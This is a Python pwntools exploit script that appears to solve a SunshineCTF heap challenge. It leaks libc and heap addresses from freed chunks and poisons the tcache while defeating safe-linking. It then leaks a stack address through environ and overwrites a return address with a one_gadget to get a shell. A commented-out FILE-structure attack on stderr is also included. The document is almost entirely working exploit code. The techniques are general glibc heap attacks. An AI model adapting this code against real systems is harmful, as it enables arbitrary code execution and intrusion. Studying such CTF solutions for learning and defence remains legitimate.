#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "chal.sunshinectf.games"
PORT = 25004

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size):
    sl(p, "new")
    sl(p,b"%i" % size)
    ru(p,b">")

def edit(p, index, offset, value):
    sl(p, "write")
    sl(p,"%i" % index)
    sl(p,"%i" % offset)
    ru(p,b"log data: ")
    sl(p,value)
    ru(p,b">")

def delete(p, index):
    sl(p, "delete")
    sl(p,"%i" % index)
    ru(p,b">")

def view(p, index):
    sl(p,b"read")
    sl(p,"%i" % index)
    return ru(p, b">")[1:-1]
    

def exploit(io,e,l):
    create(io,0x428) # 0

    create(io,0x408) # 1
    create(io,0x408) # 2
    create(io,0x408) # 3

    delete(io, 2)
    delete(io, 0)

    view(io, 0)
    libc = int.from_bytes(ru(io, b">")[1:-1], "little") - l.sym["main_arena"] - 96
    mangle = int.from_bytes(view(io, 2), "little")
    heap = mangle << 12

    print(f"==== heap 0x{heap:x}")
    print(f"==== libc 0x{libc:x}")

    stderr_addr = l.sym._IO_2_1_stderr_ + libc

    delete(io, 1)
    delete(io, 3)

    edit(io, 3, 0, p64((l.sym["environ"] - 0x18 + libc) ^ mangle))

    create(io,0x408) # 4
    create(io,0x408) # 5

    edit(io, 5, 0, b"A"*0x18)

    target = int.from_bytes(view(io, 5)[0x18:], "little") - 0x168
    target = target & (~0xf)
    print(f"environ: 0x{target:x}")

    create(io,0x428) # 6
    create(io,0x2e8) # 7
    create(io,0x2e8) # 8
    create(io,0x2e8) # 9
    delete(io,7)
    delete(io,8)
    delete(io,9)
    edit(io, 9, 0, p64((target + 1 - 0x230) ^ mangle))
    #edit(io, 9, 0, p64((target)))


    create(io,0x2e8) # 10
    create(io,0x2e8) # 11
    edit(io, 11, 568, p64(0xf72d2 + libc))

    '''
    fs = FileStructure()
    fs.flags = u64("  " + "sh".ljust(6, "\x00"))
    fs._IO_write_base = 0
    fs._IO_write_ptr = 1
    fs._lock = stderr_addr-0x10 # Should be null
    fs.chain = l.sym.system + libc
    fs._codecvt = stderr_addr
    fs._wide_data = stderr_addr - 0x48
    fs.vtable = l.sym._IO_wfile_jumps + libc
    fsb = bytes(fs)
    edit(io, 3, 0, p64((stderr_addr + libc) ^ mangle))
    '''

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
